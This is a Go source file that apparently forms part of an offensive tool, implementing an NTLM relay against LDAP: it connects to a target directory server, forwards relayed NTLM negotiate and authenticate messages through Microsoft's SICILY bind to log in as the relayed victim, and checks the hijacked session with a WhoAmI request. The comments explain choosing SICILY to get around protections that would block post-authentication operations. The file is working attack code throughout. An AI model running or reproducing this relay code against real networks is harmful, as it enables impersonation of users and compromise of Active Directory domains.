package commands

import (
	"bytes"
	"fmt"
	"net"
	"strings"
	"time"

	ber "github.com/go-asn1-ber/asn1-ber"
)

// LDAP NTLM relay bind using SICILY (MS-ADTS §5.1.1.1.3).
//
// SICILY is a Microsoft LDAP extension that wraps raw NTLM (no SPNEGO):
//   Step 1: BindRequest { name="", auth=[10] ntlmType1 } → serverCreds = ntlmType2
//   Step 2: BindRequest { name="", auth=[11] ntlmType3 } → resultCode=0 (success)
//
// Unlike SASL/GSS-SPNEGO, SICILY returns resultCode=0 directly, avoiding
// the saslBindInProgress (14) / mechListMIC issues that prevent post-auth ops.

const (
	ldapAppBindRequest  = 0
	ldapAppBindResponse = 1

	sicilyTagNegotiate = 10
	sicilyTagResponse  = 11
)

type ldapRelayConn struct {
	conn  net.Conn
	msgID int64
}

func ldapRelayDial(target string, port int, timeout time.Duration) (*ldapRelayConn, error) {
	addr := net.JoinHostPort(target, fmt.Sprintf("%d", port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", addr, err)
	}
	_ = conn.SetDeadline(time.Now().Add(timeout))
	return &ldapRelayConn{conn: conn, msgID: 1}, nil
}

func (lc *ldapRelayConn) close() {
	lc.conn.Close()
}

// negotiate sends a SICILY Negotiate BindRequest (context tag 10) with the
// raw NTLM Type 1 message and returns the NTLM Type 2 challenge.
func (lc *ldapRelayConn) negotiate(ntlmType1 []byte) ([]byte, error) {
	packet := lc.buildSICILYBindRequest(sicilyTagNegotiate, ntlmType1)

	_, err := lc.conn.Write(packet.Bytes())
	if err != nil {
		return nil, fmt.Errorf("write SICILY negotiate: %w", err)
	}

	respPacket, err := ber.ReadPacket(lc.conn)
	if err != nil {
		return nil, fmt.Errorf("read SICILY negotiate response: %w", err)
	}

	return lc.extractBindResponseCreds(respPacket)
}

// authenticate sends a SICILY Response BindRequest (context tag 11) with the
// raw NTLM Type 3 message and expects resultCode=0.
func (lc *ldapRelayConn) authenticate(ntlmType3 []byte) error {
	packet := lc.buildSICILYBindRequest(sicilyTagResponse, ntlmType3)

	_, err := lc.conn.Write(packet.Bytes())
	if err != nil {
		return fmt.Errorf("write SICILY response: %w", err)
	}

	respPacket, err := ber.ReadPacket(lc.conn)
	if err != nil {
		return fmt.Errorf("read SICILY response: %w", err)
	}

	resultCode, errMsg := lc.parseBindResult(respPacket)
	if resultCode != 0 {
		return fmt.Errorf("LDAP bind failed (code %d): %s", resultCode, errMsg)
	}
	return nil
}

// buildSICILYBindRequest constructs a SICILY BindRequest:
//
//	SEQUENCE { msgID, APPLICATION[0] { version=3, name="", auth=CONTEXT[tag] ntlmBytes } }
func (lc *ldapRelayConn) buildSICILYBindRequest(tag int, ntlmBytes []byte) *ber.Packet {
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
	lc.msgID++

	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppBindRequest, nil, "Bind Request")
	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))

	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, ber.Tag(tag), nil, "SICILY Auth")
	auth.Value = ntlmBytes
	_, _ = auth.Data.Write(ntlmBytes)
	bindReq.AppendChild(auth)

	packet.AppendChild(bindReq)
	return packet
}

func (lc *ldapRelayConn) extractBindResponseCreds(packet *ber.Packet) ([]byte, error) {
	if len(packet.Children) < 2 {
		return nil, fmt.Errorf("malformed LDAP response: expected 2+ children, got %d", len(packet.Children))
	}

	bindResp := packet.Children[1]
	if bindResp.Tag != ldapAppBindResponse {
		return nil, fmt.Errorf("expected BindResponse (tag 1), got tag %d", bindResp.Tag)
	}

	// Try serverSaslCreds [7] first (SASL standard location)
	for _, child := range bindResp.Children {
		if child.ClassType == ber.ClassContext && child.Tag == 7 {
			creds := child.ByteValue
			if len(creds) == 0 {
				creds = child.Data.Bytes()
			}
			if len(creds) > 0 {
				return creds, nil
			}
		}
	}

	// Scan all children for NTLM signature (SICILY may put Type 2 in
	// matchedDN or diagnosticMessage rather than serverSaslCreds)
	var diag []string
	for i, child := range bindResp.Children {
		data := child.ByteValue
		if len(data) == 0 {
			data = child.Data.Bytes()
		}
		if len(data) == 0 {
			if s, ok := child.Value.(string); ok && len(s) > 0 {
				data = []byte(s)
			}
		}
		diag = append(diag, fmt.Sprintf("child[%d]: class=%d tag=%d type=%d len(bv)=%d len(data)=%d len(val)=%d",
			i, child.ClassType, child.Tag, child.Type, len(child.ByteValue), len(child.Data.Bytes()), len(data)))
		if len(data) >= 8 && bytes.HasPrefix(data, sniffNTLMSig) {
			return data, nil
		}
	}

	resultCode, errMsg := lc.parseBindResult(packet)
	return nil, fmt.Errorf("no NTLM challenge in bind response (resultCode=%d, msg=%s, children: %s)", resultCode, errMsg, strings.Join(diag, "; "))
}

const ldapAppExtendedRequest = 23
const ldapAppExtendedResponse = 24

// rawWhoAmI sends a WhoAmI Extended request at the BER level (no go-ldap)
// and returns the authzID. Used to verify the connection is authenticated
// without creating a go-ldap Conn.
func (lc *ldapRelayConn) rawWhoAmI() (string, error) {
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
	lc.msgID++

	// ExtendedRequest APPLICATION[23] { requestName [0] OID }
	extReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppExtendedRequest, nil, "Extended Request")
	reqName := ber.NewString(ber.ClassContext, ber.TypePrimitive, 0, "1.3.6.1.4.1.4203.1.11.3", "WhoAmI OID")
	extReq.AppendChild(reqName)
	packet.AppendChild(extReq)

	_, err := lc.conn.Write(packet.Bytes())
	if err != nil {
		return "", fmt.Errorf("write WhoAmI: %w", err)
	}

	resp, err := ber.ReadPacket(lc.conn)
	if err != nil {
		return "", fmt.Errorf("read WhoAmI response: %w", err)
	}

	if len(resp.Children) < 2 {
		return "", fmt.Errorf("malformed WhoAmI response")
	}

	extResp := resp.Children[1]
	if extResp.Tag != ldapAppExtendedResponse {
		return "", fmt.Errorf("expected ExtendedResponse (tag %d), got tag %d", ldapAppExtendedResponse, extResp.Tag)
	}

	// ExtendedResponse: { resultCode, matchedDN, diagnosticMessage, [10]responseName?, [11]responseValue? }
	if len(extResp.Children) < 1 {
		return "", fmt.Errorf("empty ExtendedResponse")
	}

	resultCode, ok := extResp.Children[0].Value.(int64)
	if !ok {
		return "", fmt.Errorf("cannot parse result code")
	}
	if resultCode != 0 {
		errMsg := ""
		if len(extResp.Children) >= 3 && extResp.Children[2].Value != nil {
			errMsg = fmt.Sprintf("%v", extResp.Children[2].Value)
		}
		return "", fmt.Errorf("WhoAmI failed (code %d): %s", resultCode, errMsg)
	}

	// Look for responseValue [11]
	for _, child := range extResp.Children {
		if child.ClassType == ber.ClassContext && child.Tag == 11 {
			val := child.ByteValue
			if len(val) == 0 {
				val = child.Data.Bytes()
			}
			return string(val), nil
		}
	}

	return "", nil
}

func (lc *ldapRelayConn) parseBindResult(packet *ber.Packet) (int64, string) {
	if len(packet.Children) < 2 {
		return -1, "malformed response"
	}
	bindResp := packet.Children[1]
	if len(bindResp.Children) < 3 {
		return -1, "malformed bind response"
	}

	resultCode, ok := bindResp.Children[0].Value.(int64)
	if !ok {
		return -1, "cannot parse result code"
	}

	errMsg := ""
	if bindResp.Children[2].Value != nil {
		errMsg = fmt.Sprintf("%v", bindResp.Children[2].Value)
	}

	return resultCode, errMsg
}
